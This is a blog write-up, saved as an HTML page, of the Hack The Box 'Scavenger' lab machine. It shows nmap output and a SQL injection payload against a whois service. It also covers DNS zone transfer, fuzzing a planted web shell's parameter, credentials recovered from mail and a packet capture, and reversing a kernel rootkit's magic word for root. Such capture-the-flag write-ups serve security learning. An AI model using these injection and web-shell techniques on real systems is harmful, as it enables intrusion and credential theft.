@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Hack The Box: Scavenger | gr4n173</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="Hack The Box: Scavenger" />
+<meta name="author" content="gr4n173>" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Here I will explain my path for Scavenger box from Hack The Box." />
+<meta property="og:description" content="Here I will explain my path for Scavenger box from Hack The Box." />
+<link rel="canonical" href="http://localhost:4000/2020/02/29/htb-scavenger.html" />
+<meta property="og:url" content="http://localhost:4000/2020/02/29/htb-scavenger.html" />
+<meta property="og:site_name" content="gr4n173" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-02-29T00:00:00+05:45" />
+<script type="application/ld+json">
+{"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/02/29/htb-scavenger.html"},"@type":"BlogPosting","url":"http://localhost:4000/2020/02/29/htb-scavenger.html","author":{"@type":"Person","name":"gr4n173>"},"headline":"Hack The Box: Scavenger","dateModified":"2020-02-29T00:00:00+05:45","datePublished":"2020-02-29T00:00:00+05:45","description":"Here I will explain my path for Scavenger box from Hack The Box.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/public/images/blackflag.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="gr4n173" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">gr4n173<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/"><i class="fab fa-twitter"></i></a><a class="color-red-hover" href="https://gr4n173.github.io"><i class="fab fa-itch-io"></i></a><a class="color-purple-hover" href="https://github.com/gr4n173"><i class="fab fa-github"></i></a><a class="color-blue-hover" href="https://www.facebook.com/profile.php?id=100038644863435"><i class="fab fa-facebook"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/680705408297730058"><i class="fab fa-discord"></i></a><a class="color-red-hover" href="mailto:me.gr4n173@protonmail.com"><i class="fab fa-mailchimp"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+
+<img src="https://gravatar.com/avatar/6691d16a4bf77dcf1f54ee766349682a?s=256" class="author-avatar" />
+
+
+Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
+
+</div>
+
+<div class="post">
+  <h1 class="post-title">Hack The Box: Scavenger</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/linux/">linux</a>
+      
+      <a class="tag" href="/tag/htb/">htb</a>
+      
+      <a class="tag" href="/tag/ftp/">ftp</a>
+      
+      <a class="tag" href="/tag/sqli/">sqli</a>
+      
+      <a class="tag" href="/tag/RE/">RE</a>
+      
+      <a class="tag" href="/tag/lkm/">lkm</a>
+      
+      <a class="tag" href="/tag/fuzz/">fuzz</a>
+      
+      <a class="tag" href="/tag/whois/">whois</a>
+      
+      <a class="tag" href="/tag/pcap/">pcap</a>
+      
+      <a class="tag" href="/tag/ffuf/">ffuf</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 29 Feb 2020</div>
+  
+  <div class="post-description">Here I will explain my path for Scavenger box from Hack The Box.</div>
+  
+  <hr />
+<h1 id="htbscavenger">HTB:Scavenger</h1>
+
+<p>Scavenger box was the hardest box after <a href="https://gr4n173.github.io/2020/02/22/htb-zetta.html">Zetta</a> box. It falls under linux and hard category. Here, everything was all about enumeration, enumeration and enumeration. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag using <code class="highlighter-rouge">whois</code> service and dns zone transfer(axfr) along with ftp by analyzing the .pcap file then used LKM to read root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root).</p>
+
+<h1 id="box-details">Box Details</h1>
+
+<p><img src="/public/images/Scavenger_description.png" alt="scavenger_description" /></p>
+
+<p>In above picture it’s ip is 10.10.10.155, I added it to /etc/hosts as scavenger.htb. Let’s solve this box.</p>
+
+<hr />
+
+<h1 id="recon">Recon</h1>
+
+<p>Let’s start with our universal port scanner, <code class="highlighter-rouge">nmap</code> to see the open port and service which shows</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.80 scan initiated Thu Feb 27 23:24:41 2020 as: nmap -sS -sV -sC -Pn -oN nmap.txt 10.10.10.155
+Nmap scan report for www.supersechosting.htb (10.10.10.155)
+Host is up (0.29s latency).
+Not shown: 993 filtered ports
+PORT   STATE  SERVICE  VERSION
+20/tcp closed ftp-data
+21/tcp open   ftp      vsftpd 3.0.3
+22/tcp open   ssh      OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
+|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
+|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
+25/tcp open   smtp     Exim smtpd 4.89
+| smtp-commands: ib01.supersechosting.htb Hello www.supersechosting.htb [10.10.14.243], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP, 
+|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP 
+43/tcp open   whois?
+| fingerprint-strings: 
+|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
+|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+|     This query returned 0 object
+|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
+53/tcp open   domain   ISC BIND 9.10.3-P4 (Debian Linux)
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Debian
+80/tcp open   http     Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: SuperSecHosting
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port43-TCP:V=7.80%I=7%D=2/27%Time=5E57FEF1%P=x86_64-pc-linux-gnu%r(Gene
+SF:ricLines,A9,"%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
+SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
+SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
+SF:0returned\x200\x20object\r\n")%r(GetRequest,A9,"%\x20SUPERSECHOSTING\x2
+SF:0WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20i
+SF:nformation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersecho
+SF:sting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n")%r(HTT
+SF:POptions,A9,"%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@Maria
+SF:DB10\.1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING
+SF:,\x20visit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x2
+SF:0returned\x200\x20object\r\n")%r(RTSPRequest,A9,"%\x20SUPERSECHOSTING\x
+SF:20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20
+SF:information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersech
+SF:osting\.htb\r\n%\x20This\x20query\x20returned\x200\x20object\r\n")%r(He
+SF:lp,A9,"%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.
+SF:1\.37\r\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20v
+SF:isit\x20http://www\.supersechosting\.htb\r\n%\x20This\x20query\x20retur
+SF:ned\x200\x20object\r\n")%r(SSLSessionReq,103,"%\x20SUPERSECHOSTING\x20W
+SF:HOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20for\x20more\x20inf
+SF:ormation\x20on\x20SUPERSECHOSTING,\x20visit\x20http://www\.supersechost
+SF:ing\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\x20collations\x2
+SF:0\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_general_ci,COERCIBLE\
+SF:)\x20for\x20operation\x20'like'")%r(TerminalServerCookie,103,"%\x20SUPE
+SF:RSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\n%\x20fo
+SF:r\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://w
+SF:ww\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\
+SF:x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_gener
+SF:al_ci,COERCIBLE\)\x20for\x20operation\x20'like'")%r(TLSSessionReq,103,"
+SF:%\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r
+SF:\n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x2
+SF:0http://www\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20m
+SF:ix\x20of\x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(u
+SF:tf8_general_ci,COERCIBLE\)\x20for\x20operation\x20'like'");
+Service Info: Host: ib01.supersechosting.htb; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Feb 27 23:26:45 2020 -- 1 IP address (1 host up) scanned in 123.59 seconds
+
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p><strong><em>scavenger.htb</em></strong></p>
+
+<p>After I noticed <code class="highlighter-rouge">port</code> 80 was opened I visited that site and got this as output.</p>
+
+<p><img src="/public/images/scavenger_frontpage.jpg" alt="scavenger_frontpage" /></p>
+
+<p>From above picture, I got an vhost config problem which indicated hostname problem now I had to find another hostname. For that, I went back to <code class="highlighter-rouge">nmap</code> scan where I got <code class="highlighter-rouge">6</code> opened port and searched every opened port for vulnerability but got nothing since all were rabbit hole except port <code class="highlighter-rouge">43</code> of <code class="highlighter-rouge">whois</code> service. 
+		You can visit here for more about <a href="https://www.commandlinux.com/man-page/man1/whois.1.html">whois</a>. From this I made simple payload.</p>
+
+<h3 id="sqli-in-whois-service">Sqli in WHois Service</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ whois -h 10.10.10.155 -p 43 "scavenger.htb"
+% SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 0 object
+</code></pre></div></div>
+<p>From here I got new domain name and added that domain name in <code class="highlighter-rouge">/etc/hosts</code> in same ip <code class="highlighter-rouge">10.10.10.155</code>. After adding that Ip I visited that site and got this as result.</p>
+
+<p><img src="/public/images/supersechosting.jpg" alt="supersechosting_page" /></p>
+
+<p>this way I can browse a website. Here, I got nothing so I had to search more about <code class="highlighter-rouge">whois</code> service. I made payload to inject sqli in whois service to extract the files from database as.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n174:~$ whois -h 10.10.10.155 -p 43 "l33t') or 1=1#"
+ SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
+% for more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
+% This query returned 4 object
+   Domain Name: SUPERSECHOSTING.HTB
+   Registrar WHOIS Server: whois.supersechosting.htb
+   Registrar URL: http://www.supersechosting.htb
+   Updated Date: 2018-02-21T18:36:40Z 
+   Creation Date: 1997-09-15T04:00:00Z
+   Registry Expiry Date: 2020-09-14T04:00:00Z
+   Registrar: SuperSecHosting Inc.
+   Registrar IANA ID: 292
+   Registrar Abuse Contact Email: abusecomplaints@supersechosting.htb
+   Registrar Abuse Contact Phone: +1.999999999
+   Name Server: NS1.SUPERSECHOSTING.HTB
+   DNSSEC: unsigned
+   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
+&gt;&gt;&gt; Last update of whois database: 2018-12-05T14:11:05Z &lt;&lt;&lt;
+
+For more information on Whois status codes, please visit https://icann.org/epp
+
+NOTICE: The expiration date displayed in this record is the date the
+registrar's sponsorship of the domain name registration in the registry is
+currently set to expire. This date does not necessarily reflect the expiration
+date of the domain name registrant's agreement with the sponsoring
+registrar.  Users may consult the sponsoring registrar's Whois database to
+view the registrar's reported date of expiration for this registration.
+
+TERMS OF USE: You are not authorized to access or query our Whois
+database through the use of electronic processes that are high-volume and
+automated except as reasonably necessary to register domain names or
+modify existing registrations; the Data in VeriSign Global Registry
+.......
+........
+
+</code></pre></div></div>
+<p>This command extract everything that was saved in database using SQL Injection in <code class="highlighter-rouge">WHOIS</code> service since <code class="highlighter-rouge">WHOIS</code> service always needs to use database to store and extract the information.</p>
+
+<p>From above output of WHOIS command I got three more <code class="highlighter-rouge">dns</code> as<code class="highlighter-rouge"> www.justanotherblog.htb</code> <code class="highlighter-rouge">www.pwnhats.htb</code> <code class="highlighter-rouge">www.rentahacker.htb</code> and I immediately added it to <code class="highlighter-rouge">/etc/hosts</code>. After that I can browser every website of it and final dns in <code class="highlighter-rouge">/etc/hosts</code> was</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ cat /etc/hosts
+10.10.10.155    www.pwnhats.htb www.rentahacker.htb www.justanotherblog.htb www.supersechosting.htb
+</code></pre></div></div>
+<h3 id="justanotherbloghtb">justanotherblog.htb</h3>
+
+<p><img src="/public/images/justanotherblog.jpg" alt="justanotherblog" /></p>
+
+<h3 id="pwnhatshtb">pwnhats.htb</h3>
+
+<p><img src="/public/images/pwnhats.jpg" alt="pwnhats" /></p>
+
+<h3 id="rentahackerhtb">rentahacker.htb</h3>
+
+<p><img src="/public/images/rentahacker.jpg" alt="rentahacker.htb" /></p>
+
+<p>I searched every part of three website and basic method of Web Pentesting . Since there were many website of same ip so I used dns zone transfer (axfr) to know the subdomains and dig every domain as <code class="highlighter-rouge">dig @10.10.10.155 pwnhats.htb axfr</code> <code class="highlighter-rouge">dig @10.10.10.155 rentahacker.htb axfr</code>I got new subdomain of rentahacker.htb . For more info about dig you can visit <a href="https://linuxize.com/post/how-to-use-dig-command-to-query-dns-in-linux/">dig</a>.</p>
+
+<h3 id="subdomain-enumeration">Subdomain Enumeration</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n174:~$ dig @10.10.10.155 rentahacker.htb axfr
+; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5-Debian &lt;&lt;&gt;&gt; @10.10.10.155 rentahacker.htb axfr                                                                                 
+; (1 server found)                                                                                                                                    
+;; global options: +cmd                                                                                                                               
+rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800                      
+rentahacker.htb.        604800  IN      NS      ns1.supersechosting.htb.                                                                              
+rentahacker.htb.        604800  IN      MX      10 mail1.rentahacker.htb.                                                                             
+rentahacker.htb.        604800  IN      A       10.10.10.155                                                                                          
+mail1.rentahacker.htb.  604800  IN      A       10.10.10.155                                                                                          
+sec03.rentahacker.htb.  604800  IN      A       10.10.10.155                                                                                          
+www.rentahacker.htb.    604800  IN      A       10.10.10.155                                                                                          
+rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800                      
+;; Query time: 883 msec
+;; SERVER: 10.10.10.155#53(10.10.10.155)
+;; WHEN: Fri Feb 28 00:09:07 +0545 2020
+;; XFR size: 8 records (messages 1, bytes 251)
+</code></pre></div></div>
+<p>Since 10.10.10.155 was ip here I used it as name server and rentahacker.htb as a url for dns zone transfer using axfr. Now <code class="highlighter-rouge">sec03.rentahacker.htb</code> was added in <code class="highlighter-rouge">/etc/hosts</code>too.</p>
+
+<h3 id="sec03rentahackerhtb">sec03.rentahacker.htb</h3>
+
+<p><img src="/public/images/sec03_page.jpg" alt="sec03page" /></p>
+
+<p>After that, I searched for directory using dirsearch as</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ ./dirsearch.py -u http://sec03.rentahacker.htb/ -e html,txt,php,pcap,bzip,tar,bak
+
+</code></pre></div></div>
+<p>Here I got <code class="highlighter-rouge">shell.php</code> as an interesting dir. Then, searched for parameter in <code class="highlighter-rouge">shell.php?FUZZ=</code> where I used ffuf tool .</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ffuf -w ~/Downloads/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://sec03.rentahacker.htb/shell.php?FUZZ=id                                                                                                        
+                                                                                                                                                      
+        /'___\  /'___\           /'___\                                                                                                               
+       /\ \__/ /\ \__/  __  __  /\ \__/                                                                                                               
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                                                                              
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                                                                              
+         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                               
+          \/_/    \/_/   \/___/    \/_/                                                                                                               
+                                                                                                                                                      
+       v0.12                                                                                                                                          
+________________________________________________                                                                                                      
+                                                                                                                                                      
+ :: Method           : GET                                                                                                                            
+ :: URL              : http://sec03.rentahacker.htb/shell.php?FUZZ=id                                                                              
+ :: Follow redirects : false                                                                                                                          
+ :: Calibration      : false                                                                                                                          
+ :: Timeout          : 10                                                                                                                             
+ :: Threads          : 40                                                                                                                             
+ :: Matcher          : Response status: 200,204,301,302,307,401,403                                                                                   
+________________________________________________                                                                                                      
+                                                                                                                                                      
+password                [Status: 200, Size: 0, Words: 1, Lines: 1]                                                                                    
+email                   [Status: 200, Size: 0, Words: 1, Lines: 1]                                                                                    
+url                     [Status: 200, Size: 0, Words: 1, Lines: 1]                                                                                    
+type                    [Status: 200, Size: 0, Words: 1, Lines: 1]
+.....
+hidden                  [Status: 200, Size: 61, Words: 3, Lines: 2]                                                                                   
+</code></pre></div></div>
+
+<p>From here I got <code class="highlighter-rouge">hidden</code> as parameter and got <code class="highlighter-rouge">ib01c03</code> as output in browser. This indicated I can now run commands from the browser. You can see the output below.</p>
+
+<p><img src="/public/images/shell_page.png" alt="shell_page" /></p>
+
+<h2 id="rce-as-ib01c03">RCE as ib01c03</h2>
+<h3 id="users-ib01c03-ib01ftp-ib01c01">Users: ib01c03-&gt;ib01ftp-&gt;ib01c01</h3>
+
+<p>After getting web-shell I searched every possible part of that user and finally got mail in <code class="highlighter-rouge">/var/mail/</code> directory i.e. <code class="highlighter-rouge">ib01c03</code> with my <code class="highlighter-rouge">cat</code> I got this</p>
+
+<p><img src="/public/images/credentials.png" alt="credentials" /></p>
+
+<p>You can see the credentials username/password. I used that user/pass 
+to login ftp and I m into ib01ftp user now.</p>
+
+<h3 id="ftp">FTP</h3>
+<p><strong><em>ib01ftp-&gt;ib01c01-&gt;user.txt</em></strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ ftp www.supersechosting.htb
+Connected to www.supersechosting.htb.
+220 (vsFTPd 3.0.3)
+Name (www.supersechosting.htb:bikram): ib01ftp
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+</code></pre></div></div>
+<p>After alot searched in every directory I got <code class="highlighter-rouge">incidents</code> and <code class="highlighter-rouge">ibo1c01_incident.pcap</code> file inside <code class="highlighter-rouge">ib01c01</code>. Then downloaded it to my local machine for that I used below command.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; get ib01c01_incident.pcap
+local: ib01c01_incident.pcap remote: ib01c01_incident.pcap
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for ib01c01_incident.pcap (835084 bytes).
+226 Transfer complete.
+835084 bytes received in 6.58 secs (123.9393 kB/s)
+</code></pre></div></div>
+<p>You can get .pcap file here: <a href="/public/files/ib01c01_incident.pcap">pcap</a>. It would be a great idea if we try strings for .pcap file so I analyzed .pcap file with <code class="highlighter-rouge">strings</code> and got this result.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ strings ib01c01_incident.pcap | grep passwd
+ajax=1&amp;token=&amp;controller=AdminLogin&amp;submitLogin=1&amp;passwd=pwnhats.htb&amp;email=admin%40pwnhats.htb&amp;redirect=http%3A%2F%2Fwww.pwnhats.htb%2Fadmin530o6uisg%2F%26token%3De44d0ae2213d01986912abc63712a05b
+                                                &lt;label class="control-label" for="passwd"&gt;
+                                                &lt;input name="passwd" type="password" id="passwd" class="form-control" value="" tabindex="2" placeholder="&amp;#xf084 Password" /&gt;
+ajax=1&amp;token=&amp;controller=AdminLogin&amp;submitLogin=1&amp;passwd=GetYouAH4t%21&amp;email=pwnhats%40pwnhats.htb&amp;redirect=http%3a//www.pwnhats.htb/admin530o6uisg/%26token%3de44d0ae2213d01986912abc63712a05b
+
+</code></pre></div></div>
+<p>From here I got passwd <code class="highlighter-rouge">GetYouAH4t%21</code> where <code class="highlighter-rouge">%21=!</code> so <code class="highlighter-rouge">GetYouAH4t!</code>. So basically we had to give a try any commands for any file. I  tried this passin every user which I got from ftp</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwx------    5 1001     1004         4096 Feb 28 06:23 ib01c01
+drwx------    3 1002     1004         4096 Dec 11  2018 ib01c02
+drwx------    4 1003     1004         4096 Jan 30  2019 ib01c03
+dr-xrwx---    3 1005     1000         4096 Dec 10  2018 ib01ftp
+drwx------    3 1004     1000         4096 Dec 10  2018 ib01www
+drwx------    2 1000     1000         4096 Feb 02  2019 support
+</code></pre></div></div>
+<p>Finally I m into <code class="highlighter-rouge">ib01c01</code> user on <code class="highlighter-rouge">ls</code> I got user.txt and downloaded to my local machine using <code class="highlighter-rouge">get</code></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; get user.txt 
+local: user.txt remote: user.txt
+No control connection for command: Success
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ cat user.txt
+6f8a8a************
+</code></pre></div></div>
+<p>This way I got the user.txt file without getting shell for user.</p>
+
+<h1 id="unprivelege--privilege-escalation">Unprivelege-&gt; Privilege Escalation</h1>
+<p><strong>ftp-&gt;ib01c01-&gt;.pcap</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n173:~$ ftp www.supersechosting.htb
+Connected to www.supersechosting.htb.
+220 (vsFTPd 3.0.3)
+Name (www.supersechosting.htb:bikram): ib01c01
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
+-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
+-rw-r-----    1 0        1004           33 Dec 07  2018 user.txt
+drwxr-xr-x   26 1001     1004         4096 Dec 10  2018 www
+226 Directory send OK.
+</code></pre></div></div>
+<p>While doing enumeration it would be better if you analyze/use the files which was found before. So I analyzed .pcap file with wireshark and got file root.c .</p>
+
+<p><em>Wireshark: File-&gt;Export Objects-&gt;HTTP</em></p>
+
+<p><img src="/public/images/incident_pcapfile.png" alt="incident_pcapfile" /></p>
+
+<p>Then, I downloaded it in my local machine. You can get file here <a href="/public/files/root.c">root.c</a>. After analyzing this file I noticed that it is Kernel Rootkit. There is a saying</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree"
+</code></pre></div></div>
+<p>and found really good source for it you can visit here: <a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485">detail</a>.</p>
+
+<p><strong>LKM-&gt; ‘magic’-&gt; Root</strong></p>
+
+<p>After reading above blog I noticed that I should had <code class="highlighter-rouge">root.ko</code> file and a word <code class="highlighter-rouge">magic</code>. At first, I searched for word magic in root.c file and got <code class="highlighter-rouge">g0tR0ot</code>. I tried with that word in browser from previous user <code class="highlighter-rouge">ib01c03</code>with payload as
+<img src="/public/images/lkm_rootkit.png" alt="lkm_rootkit" />
+and got same user so word <code class="highlighter-rouge">magic</code> was changed. For that I searched that word in every part of home dir of <code class="highlighter-rouge">ib01c01</code> and found <code class="highlighter-rouge">old school way of hidding a files </code> on <code class="highlighter-rouge">ls -al</code> I got this.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; ls -al
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwx------    5 1001     1004         4096 Feb 28 06:23 .
+drwxr-xr-x    8 0        0            4096 Dec 07  2018 ..
+drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 ...
+-rw-------    1 0        0               0 Dec 11  2018 .bash_history
+drwx------    2 1001     1004         4096 Feb 28 06:23 .ssh
+-rw-------    1 1001     1004           32 Jan 30  2019 access.txt
+-rw-r--r--    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
+-rw-r-----    1 0        1004           33 Dec 07  2018 user.txt
+drwxr-xr-x   26 1001     1004         4096 Dec 10  2018 www
+</code></pre></div></div>
+<p>There I noticed <code class="highlighter-rouge">...</code> directory where I found <code class="highlighter-rouge">root.ko</code> file
+and downloaded it to my local machine using command as previous. Since <code class="highlighter-rouge">root.ko</code> file was ELF file so I tried simple <code class="highlighter-rouge">head</code> command as</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@gr4n174:~$ head -n1 root.ko
+ELF&gt;@@&amp;%GNUœ-ME&lt;_|1HATUHzSI@HH eH%(HD$1Hg0tR0otD$g3tD$
+                                                      Pr1vHD$D$Hu,HHHL$eH3
+                                                                       %(H []A\H1HHLHLD$
+                                                                                           HL$H|$Ht$HuiHItiHADAD$LAD$AD$AD$AD$
+D$ AD$HH1H11IHyHHHHHH=Hv-=H1HtHH=11I1H=Hv7H==H1H5H=H=H==H1HttyRK: 
+Cannot prepare credentials 
+
+</code></pre></div></div>
+
+<p>From here I got two word <code class="highlighter-rouge">g0tR0ot</code> and <code class="highlighter-rouge">g3tPr1v</code> since first word was <code class="highlighter-rouge">magic</code> word from root.c but second one wasn’t from there so I tried that word and luckly got the root.</p>
+
+<p><img src="/public/images/root_magic.png" alt="root_magic" /></p>
+
+<p>Now I can read root.txt file as</p>
+
+<p><img src="/public/images/root_txt.jpg" alt="root_txt" /></p>
+
+<hr />
+
+<h2 id="alternative-method-to-root">Alternative Method to Root</h2>
+<h3 id="reverse-engineering">Reverse Engineering</h3>
+<p>Though I got the root from simple way and I tried other way to get root. As <code class="highlighter-rouge">root.ko</code> file was ELF file and I love reversing the ELF file so I analyzed using my latest favorite tool <code class="highlighter-rouge">ghidra</code>. I opened it using <code class="highlighter-rouge">ghidra</code> if you are unfamiliar with <code class="highlighter-rouge">ghidra </code> tool you can see more about it here: <a href="https://www.ghidra-sre.org/">ghidra</a>.</p>
+
+<p>From the analysis of file root.c word <code class="highlighter-rouge">magic</code> was in function <code class="highlighter-rouge">root_write()</code>. So I checked that function in <code class="highlighter-rouge">ghidra</code> and got below as result.</p>
+
+<p><img src="/public/images/root_write.png" alt="root_write" /></p>
+
+<p>There I saw three variables as <code class="highlighter-rouge">local_31</code> <code class="highlighter-rouge">local_2d</code> <code class="highlighter-rouge">local_28</code> which was defined already. But these variable was defined in <code class="highlighter-rouge">little Indian</code> format. If you are unfamiliar with this format then don’t worry I will explain in my next blog.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  local_31 = 0x743367; # g3t
+  local_2d = 0x76317250; # Pr1v
+  local_28 = 0x746f3052743067; # g0tR0ot
+</code></pre></div></div>
+<p>And on analyzing more about that function I got something fishy in <code class="highlighter-rouge">snprintf((char *)&amp;local_28,8,"%s%s",&amp;local_31,&amp;local_2d);</code>. In the above function from <code class="highlighter-rouge">ghidra</code> I found that value of <code class="highlighter-rouge">local_28</code> is replaced with <code class="highlighter-rouge">local_31+local_2d</code>. If you are unfamiliar about <code class="highlighter-rouge">snprintf</code> function you can visit here <a href="http://joequery.me/code/snprintf-c/">snprintf</a>.</p>
+
+<p>So my final <code class="highlighter-rouge">magic</code> word was <code class="highlighter-rouge">g3tPr1v</code>. Using this as above in browser, I  got the root.txt file.</p>
+
